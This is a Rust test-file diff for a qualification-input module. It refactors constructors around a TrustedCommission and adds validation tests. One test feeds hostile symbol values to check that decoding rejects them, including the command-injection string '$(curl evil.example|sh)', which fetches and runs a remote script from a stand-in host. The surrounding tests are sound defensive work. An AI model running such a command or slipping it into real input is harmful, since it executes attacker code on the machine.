@@ -3,7 +3,7 @@
 // License, v. 2.0. If a copy of the MPL was not distributed with this
 // file, You can obtain one at https://mozilla.org/MPL/2.0/.
 
-use sim_kernel::{ContentId, Datum, Symbol};
+use sim_kernel::{Datum, Symbol};
 
 use super::*;
 
@@ -30,24 +30,16 @@ public heads and their pins retained only one. Cache identity was too broad.\n"
         .to_vec()
 }
 
-fn procedure() -> ContentId {
-    Datum::Node {
-        tag: Symbol::qualified("qualification", "restated-measurements-procedure-v1"),
-        fields: vec![],
+fn commission() -> TrustedCommission {
+    TrustedCommission {
+        producer: Symbol::qualified("authoring", "producer"),
+        authority: Symbol::qualified("authoring", "commission"),
+        review: Symbol::qualified("authoring", "review-name-only"),
     }
-    .content_id()
-    .unwrap()
 }
 
 fn authored() -> NeutralQualificationInput {
-    NeutralQualificationInput::author_restated(
-        &source(),
-        procedure(),
-        Symbol::qualified("authoring", "producer"),
-        Symbol::qualified("authoring", "commission"),
-        Symbol::qualified("authoring", "review-name-only"),
-    )
-    .unwrap()
+    NeutralQualificationInput::author_restated(&source(), &commission()).unwrap()
 }
 
 fn gap(result: Result<NeutralQualificationInput>) -> NeutralInputGap {
@@ -121,7 +113,9 @@ fn restated_table_round_trips_and_keeps_every_table_fact() {
     let datum = input.to_datum().unwrap();
     let decoded = NeutralQualificationInput::from_datum(&datum).unwrap();
     assert_eq!(decoded, input);
-    decoded.verify_restated_measurements(&source()).unwrap();
+    decoded
+        .verify_restated_measurements(&source(), &commission())
+        .unwrap();
     let f = &decoded.facts;
     assert_eq!((f.scheduled, f.materialized, f.revisions), (270, 269, 230));
     assert_eq!(f.overlapping_span_milliseconds, 2_027_988_000);
@@ -312,7 +306,7 @@ fn source_binding_is_exact_bytes_and_exact_table() {
     other.push(b'\n');
     assert_eq!(
         decoded
-            .verify_restated_measurements(&other)
+            .verify_restated_measurements(&other, &commission())
             .unwrap_err()
             .gap,
         NeutralInputGap::SourceMismatch
@@ -320,18 +314,12 @@ fn source_binding_is_exact_bytes_and_exact_table() {
     let changed = String::from_utf8(source())
         .unwrap()
         .replace("| Plan revisions | 230 |", "| Plan revisions | 231 |");
-    let reauthored = NeutralQualificationInput::author_restated(
-        changed.as_bytes(),
-        procedure(),
-        Symbol::qualified("authoring", "producer"),
-        Symbol::qualified("authoring", "commission"),
-        Symbol::qualified("authoring", "review-name-only"),
-    )
-    .unwrap();
+    let reauthored =
+        NeutralQualificationInput::author_restated(changed.as_bytes(), &commission()).unwrap();
     // A slot authored for another source never verifies against this one.
     assert_eq!(
         reauthored
-            .verify_restated_measurements(&source())
+            .verify_restated_measurements(&source(), &commission())
             .unwrap_err()
             .gap,
         NeutralInputGap::SourceMismatch
@@ -341,7 +329,7 @@ fn source_binding_is_exact_bytes_and_exact_table() {
     lying.facts.revisions += 1;
     assert_eq!(
         lying
-            .verify_restated_measurements(&source())
+            .verify_restated_measurements(&source(), &commission())
             .unwrap_err()
             .gap,
         NeutralInputGap::FactMismatch
@@ -351,7 +339,7 @@ fn source_binding_is_exact_bytes_and_exact_table() {
     wrong_region.derivation.source_digests[1].digest = [9; 32];
     assert_eq!(
         wrong_region
-            .verify_restated_measurements(&source())
+            .verify_restated_measurements(&source(), &commission())
             .unwrap_err()
             .gap,
         NeutralInputGap::SourceMismatch
@@ -394,5 +382,174 @@ fn size_bound_is_enforced() {
             .unwrap_err()
             .gap,
         NeutralInputGap::Oversize
+    );
+}
+
+fn sym_datum(ns: &str, name: &str) -> Datum {
+    Datum::Symbol(Symbol::qualified(ns, name))
+}
+
+#[test]
+fn free_form_symbols_cannot_smuggle_text_or_invent_a_review() {
+    let d = authored().to_datum().unwrap();
+    for hostile in [
+        sym_datum("https://evil.example", "run"),
+        sym_datum("authoring", "$(curl evil.example|sh)"),
+        sym_datum("authoring", "PASS"),
+        sym_datum("authoring", ""),
+        sym_datum("other", "producer"),
+    ] {
+        let tampered = edit(&d, &["derivation", "producer"], &|_| hostile.clone());
+        assert_eq!(
+            gap(NeutralQualificationInput::from_datum(&tampered)),
+            NeutralInputGap::ForbiddenText
+        );
+    }
+}
+
+#[test]
+fn content_ids_must_use_the_registered_algorithm() {
+    let d = authored().to_datum().unwrap();
+    let wrong = edit(&d, &["selected-source", "algorithm"], &|_| {
+        sym_datum("core", "sha256")
+    });
+    assert_eq!(
+        gap(NeutralQualificationInput::from_datum(&wrong)),
+        NeutralInputGap::UnrecognizedTag
+    );
+}
+
+#[test]
+fn oversize_is_refused_by_decode_and_by_admission() {
+    let d = authored().to_datum().unwrap();
+    let huge = edit(&d, &["derivation", "producer"], &|_| {
+        sym_datum("authoring", &"a".repeat(70_000))
+    });
+    assert_eq!(
+        gap(NeutralQualificationInput::from_datum(&huge)),
+        NeutralInputGap::Oversize
+    );
+    let ok = NeutralQualificationInput::admit(&d, 4_000, &source(), &commission());
+    assert!(ok.is_ok());
+    let over =
+        NeutralQualificationInput::admit(&d, MAX_NEUTRAL_INPUT_BYTES + 1, &source(), &commission());
+    assert_eq!(over.unwrap_err().gap, NeutralInputGap::Oversize);
+}
+
+#[test]
+fn admission_binds_the_trusted_commission_procedure_and_precision() {
+    let good = authored();
+    let mut other = commission();
+    other.review = Symbol::qualified("authoring", "another-review");
+    assert_eq!(
+        good.verify_restated_measurements(&source(), &other)
+            .unwrap_err()
+            .gap,
+        NeutralInputGap::Identity
+    );
+    let mut procedure = good.clone();
+    procedure.derivation.procedure = Datum::Node {
+        tag: Symbol::qualified("qualification", "other"),
+        fields: vec![],
+    }
+    .content_id()
+    .unwrap();
+    assert_eq!(
+        procedure
+            .verify_restated_measurements(&source(), &commission())
+            .unwrap_err()
+            .gap,
+        NeutralInputGap::Identity
+    );
+    let mut precision = good.clone();
+    precision.derivation.precision.source_decimal_places = 99;
+    let round_trip = NeutralQualificationInput::from_datum(&precision.to_datum().unwrap()).unwrap();
+    assert_eq!(
+        round_trip
+            .verify_restated_measurements(&source(), &commission())
+            .unwrap_err()
+            .gap,
+        NeutralInputGap::FactMismatch
+    );
+    let mut roles = good.clone();
+    roles.derivation.source_digests.reverse();
+    assert_eq!(
+        roles
+            .verify_restated_measurements(&source(), &commission())
+            .unwrap_err()
+            .gap,
+        NeutralInputGap::SourceMismatch
+    );
+    let mut duplicated = good;
+    duplicated.derivation.source_digests[1] = duplicated.derivation.source_digests[0];
+    assert_eq!(
+        duplicated
+            .verify_restated_measurements(&source(), &commission())
+            .unwrap_err()
+            .gap,
+        NeutralInputGap::SourceMismatch
+    );
+}
+
+#[test]
+fn contrast_sentences_are_bound_to_their_subject_and_population() {
+    let s = String::from_utf8(source()).unwrap();
+    for (from, to) in [
+        (
+            "A change to three\npublic heads and their pins retained only one.",
+            "An unrelated actor retained only one.",
+        ),
+        (
+            "retained 213 of 280 proof receipts",
+            "retained 213 of 281 proof receipts",
+        ),
+        (
+            "retained 213 of 280 proof receipts",
+            "retained 213 proof receipts",
+        ),
+        (
+            "A control-only repair retained 213 of 280 proof receipts.",
+            "A control-only repair retained 213 of 280 proof receipts. A control-only repair retained 1 of 280 proof receipts.",
+        ),
+    ] {
+        let mutated = s.replace(from, to);
+        assert_ne!(mutated, s, "{from:?}");
+        assert_eq!(
+            RestatedMeasurements::from_source(mutated.as_bytes())
+                .unwrap_err()
+                .gap,
+            NeutralInputGap::FactMismatch,
+            "{from:?}"
+        );
+    }
+}
+
+#[test]
+fn overflowing_source_rows_are_a_named_gap_not_a_panic() {
+    let s = String::from_utf8(source()).unwrap().replace(
+        "26 green, 1 interrupted, 253 pending",
+        "18446744073709551615 green, 1 interrupted, 0 pending",
+    );
+    let result = std::panic::catch_unwind(|| RestatedMeasurements::from_source(s.as_bytes()));
+    assert_eq!(
+        result.expect("must not panic").unwrap_err().gap,
+        NeutralInputGap::Arithmetic
+    );
+}
+
+#[test]
+fn previous_fixed_point_is_its_own_all_green_population() {
+    let mut input = authored();
+    let r = input
+        .facts
+        .contrast_reuse
+        .iter_mut()
+        .find(|r| r.contrast == ReuseContrast::PreviousFixedPoint)
+        .unwrap();
+    r.denominator += 1;
+    let d = input.to_datum().unwrap();
+    assert_eq!(
+        gap(NeutralQualificationInput::from_datum(&d)),
+        NeutralInputGap::Arithmetic
     );
 }
